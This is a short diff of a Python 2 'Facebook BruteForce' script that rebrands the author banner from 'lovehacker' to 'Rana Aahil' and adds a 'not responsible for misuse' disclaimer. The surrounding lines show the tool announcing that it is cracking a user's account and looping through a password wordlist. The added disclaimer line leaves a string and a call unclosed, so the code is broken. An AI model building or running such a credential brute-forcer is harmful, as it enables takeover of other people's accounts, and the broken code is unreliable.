@@ -4,8 +4,8 @@
         
         #############################################
         #                                           #
-        #    Facebook BruteForce, by lovehacker     #
-        #    WhatsApp Contact:       03094161457    #
+        #    Facebook BruteForce, by Rana Aahil     #
+        #    Facebook Contact:       Aahil.         #
         #                                           #
         #############################################
 
@@ -33,9 +33,9 @@ except FileNotFoundError:
 
 time.sleep(0.8)
 print '\n\nCracking '+user+' Now...'
-
 time.sleep(1)
-print '\n###############BlackMafia LoveHacker##############\n'
+jalan("\033[1;96mIM NOT RESPONSIBLE FOR ANY MISS USE - AAHIL
+print '\n###############BlackTiger Rana Aahil##############\n'
 for password in wordlist:
     if password == '' or password == ' ':
         pass
